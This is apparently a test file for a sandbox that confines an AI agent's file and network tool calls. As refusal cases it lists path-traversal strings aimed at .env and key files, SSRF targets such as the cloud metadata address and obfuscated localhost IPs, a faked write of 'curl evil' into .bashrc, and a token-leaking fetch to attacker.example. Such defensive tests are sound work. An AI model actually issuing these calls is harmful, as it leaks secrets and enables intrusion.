import re

from dojo_ai import create_model

POLICY = {"allowedHosts": ["registry.npmjs.org", "docs.example.com", "*.github.com"]}


def disk():
    return modules["memory_file_system.py"].file_system


class FakeResponse:
    def __init__(self, status, body, location=None):
        self.status = status
        self.headers = {} if location is None else {"location": location}
        self.body = body

    async def text(self):
        return self.body


class Spy:
    """Records every call and delegates to the async implementation."""

    def __init__(self, implementation):
        self.implementation = implementation
        self.calls = []

    async def __call__(self, *arguments, **keyword_arguments):
        self.calls.append([*arguments, keyword_arguments])
        return await self.implementation(*arguments, **keyword_arguments)


@test("create_jail resolves paths inside the root and rejects traversal, absolute escapes, sibling prefixes and NUL bytes")
async def _():
    jail = mod.create_jail("workspace")
    assert jail.root == "/app/workspace"
    assert jail.resolve("notes/todo.md") == "/app/workspace/notes/todo.md"
    assert jail.resolve("./notes/../src/index.ts") == "/app/workspace/src/index.ts"
    assert jail.resolve(".") == "/app/workspace"
    assert jail.resolve("/app/workspace/src/a.ts") == "/app/workspace/src/a.ts"
    for escape in ["../secrets.txt", "notes/../../.env", "/etc/passwd", "/app/workspace-secrets/key.pem", "/app/workspace/../app/.env", "/app"]:
        error = await capture_error(lambda: jail.resolve(escape))
        assert isinstance(error, mod.SandboxError), escape
        assert error.code == "path_escape", escape
    for invalid in ["", "notes\0.md"]:
        error = await capture_error(lambda: jail.resolve(invalid))
        assert error.code == "invalid_path", invalid


@test("the jail reads, writes with missing parent folders and lists inside the root, and never touches the disk outside it")
async def _():
    disk().write_files({"workspace/src/index.ts": "export {};", "workspace/README.md": "# Shop", ".env": "TOKEN=secret", "workspace-secrets/key.pem": "KEY"})
    jail = mod.create_jail("/app/workspace/")
    assert await jail.read_file("README.md") == "# Shop"
    await jail.write_file("reports/2026/summary.md", "ok")
    assert disk().read_file("/app/workspace/reports/2026/summary.md") == "ok"
    assert await jail.list() == ["README.md", "reports", "src"]
    assert await jail.list("src") == ["index.ts"]
    assert isinstance(await capture_error(jail.read_file("missing.md")), FileNotFoundError)
    assert (await capture_error(jail.read_file("../.env"))).code == "path_escape"
    assert (await capture_error(jail.write_file("../workspace-secrets/key.pem", "overwritten"))).code == "path_escape"
    assert (await capture_error(jail.list(".."))).code == "path_escape"
    assert disk().read_file("/app/workspace-secrets/key.pem") == "KEY"


@test("check_egress allows exact hosts and strict subdomains of wildcard entries only")
def _():
    assert mod.check_egress("https://registry.npmjs.org/zod", POLICY) == {"allowed": True, "host": "registry.npmjs.org"}
    assert mod.check_egress("https://API.GitHub.com/repos", POLICY) == {"allowed": True, "host": "api.github.com"}
    assert mod.check_egress("https://docs.example.com./guide", POLICY) == {"allowed": True, "host": "docs.example.com"}
    assert mod.check_egress("https://github.com/", POLICY) == {"allowed": False, "reason": "not_allowlisted"}
    assert mod.check_egress("https://evilgithub.com/", POLICY) == {"allowed": False, "reason": "not_allowlisted"}
    assert mod.check_egress("https://registry.npmjs.org.attacker.example/zod", POLICY) == {"allowed": False, "reason": "not_allowlisted"}
    assert mod.check_egress("https://docs.example.com:8443/", POLICY) == {"allowed": False, "reason": "port"}
    with_http = {**POLICY, "allowedSchemes": ["https:", "http:"]}
    assert mod.check_egress("http://docs.example.com/", with_http) == {"allowed": True, "host": "docs.example.com"}


@test("check_egress refuses bad schemes, credentials, IP literals in every spelling and localhost, in the documented order")
def _():
    def reasons(urls):
        return [mod.check_egress(url, POLICY) for url in urls]

    assert reasons(["not a url", "docs.example.com/guide"]) == [{"allowed": False, "reason": "invalid_url"}] * 2
    assert reasons(["http://docs.example.com/", "file:///etc/passwd", "ftp://registry.npmjs.org/", "http://127.0.0.1/"]) == [{"allowed": False, "reason": "scheme"}] * 4
    assert reasons(["https://user:secret@docs.example.com/", "https://token@registry.npmjs.org/"]) == [{"allowed": False, "reason": "credentials"}] * 2
    ip_literals = [
        "https://127.0.0.1/",
        "https://0x7f000001/",
        "https://2130706433/",
        "https://127.1/",
        "https://017700000001/",
        "https://169.254.169.254/latest/meta-data/",
        "https://[::1]/",
        "https://[fd00::1]/",
    ]
    assert reasons(ip_literals) == [{"allowed": False, "reason": "ip_literal"}] * 8
    assert reasons(["https://localhost/", "https://LOCALHOST./admin", "https://admin.localhost/"]) == [{"allowed": False, "reason": "local_host"}] * 3
    assert mod.check_egress("https://localhost/", {"allowedHosts": ["localhost"]}) == {"allowed": False, "reason": "local_host"}


@test("the fetch tool checks every URL before fetching it, including each redirect hop")
async def _():
    async def respond_to(url, **options):
        if url == "https://docs.example.com/old":
            return FakeResponse(301, "", "/new")
        if url == "https://docs.example.com/new":
            return FakeResponse(200, "docs body")
        if url == "https://docs.example.com/metadata":
            return FakeResponse(302, "", "http://169.254.169.254/latest/meta-data/")
        if url == "https://docs.example.com/loop":
            return FakeResponse(307, "", "https://docs.example.com/loop")
        return FakeResponse(404, "not found")

    fetch = Spy(respond_to)
    fetch_url = mod.create_fetch_tool(fetch=fetch, policy=POLICY)

    assert await fetch_url("https://docs.example.com/old") == {"status": 200, "url": "https://docs.example.com/new", "body": "docs body"}
    assert fetch.calls == [
        ["https://docs.example.com/old", {"redirect": "manual"}],
        ["https://docs.example.com/new", {"redirect": "manual"}],
    ]
    assert await fetch_url("https://docs.example.com/missing") == {"status": 404, "url": "https://docs.example.com/missing", "body": "not found"}

    denied = await capture_error(fetch_url("https://2130706433/admin"))
    assert isinstance(denied, mod.SandboxError)
    assert denied.code == "egress_denied"
    assert re.search(r"ip_literal", str(denied))
    assert len(fetch.calls) == 3

    assert (await capture_error(fetch_url("https://docs.example.com/metadata"))).code == "egress_denied"
    assert len(fetch.calls) == 4

    assert (await capture_error(fetch_url("https://docs.example.com/loop"))).code == "egress_denied"
    assert len(fetch.calls) == 8


@test("execute_tool_call runs the model’s tool calls inside the sandbox and turns every refusal into an Error tool message")
async def _():
    disk().write_files({"workspace/README.md": "# Shop", ".env": "TOKEN=secret"})
    jail = mod.create_jail("workspace")

    async def registry(url, **options):
        return FakeResponse(200, '{"name":"zod"}')

    fetch = Spy(registry)
    fetch_url = mod.create_fetch_tool(fetch=fetch, policy=POLICY)
    model = create_model()
    fake_model.reply(
        respond.tool_calls([
            {"name": "read_file", "arguments": {"path": "README.md"}},
            {"name": "write_file", "arguments": {"path": "notes/plan.md", "content": "step 1"}},
            {"name": "list_files", "arguments": {}},
            {"name": "fetch_url", "arguments": {"url": "https://registry.npmjs.org/zod"}},
        ]),
        respond.tool_calls([
            {"name": "read_file", "arguments": {"path": "../.env"}},
            {"name": "write_file", "arguments": {"path": "/app/.bashrc", "content": "curl evil"}},
            {"name": "fetch_url", "arguments": {"url": "https://attacker.example/?q=TOKEN"}},
            {"name": "read_file", "arguments": {"path": "missing.md"}},
        ]),
        respond.invalid_tool_arguments("read_file"),
        respond.unknown_tool("delete_everything"),
    )
    request = {"messages": [{"role": "user", "content": "Summarize the project."}]}

    allowed = await model.generate(request)
    results = [await mod.execute_tool_call(tool_call, jail=jail, fetch_url=fetch_url) for tool_call in allowed["toolCalls"]]
    assert [[message["role"], message["toolCallId"]] for message in results] == [["tool", call["id"]] for call in allowed["toolCalls"]]
    assert results[0]["content"] == "# Shop"
    assert re.search(r"notes/plan\.md", results[1]["content"])
    assert results[2]["content"].split("\n") == ["README.md", "notes"]
    assert results[3]["content"] == '{"name":"zod"}'
    assert disk().read_file("/app/workspace/notes/plan.md") == "step 1"

    refused = await model.generate(request)
    refusals = [await mod.execute_tool_call(tool_call, jail=jail, fetch_url=fetch_url) for tool_call in refused["toolCalls"]]
    assert re.match(r"Error:.*path_escape", refusals[0]["content"])
    assert re.match(r"Error:.*path_escape", refusals[1]["content"])
    assert re.match(r"Error:.*egress_denied", refusals[2]["content"])
    assert refusals[3]["content"].startswith("Error:")
    assert disk().exists("/app/.bashrc") is False
    assert len(fetch.calls) == 1

    for response in [await model.generate(request), await model.generate(request)]:
        message = await mod.execute_tool_call(response["toolCalls"][0], jail=jail, fetch_url=fetch_url)
        assert message["toolCallId"] == response["toolCalls"][0]["id"]
        assert message["content"].startswith("Error:")
